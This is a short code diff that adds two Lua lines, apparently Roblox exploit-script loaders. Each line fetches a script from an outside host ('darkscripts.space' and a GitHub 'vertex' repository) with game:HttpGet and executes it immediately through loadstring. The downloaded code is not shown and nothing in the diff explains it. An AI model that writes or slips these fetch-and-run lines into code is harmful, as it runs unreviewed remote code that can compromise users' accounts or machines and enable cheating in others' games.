@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/e3905125-74f1-4271-8626-12fe78637961_1192854516018716773.lua',true))()                 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
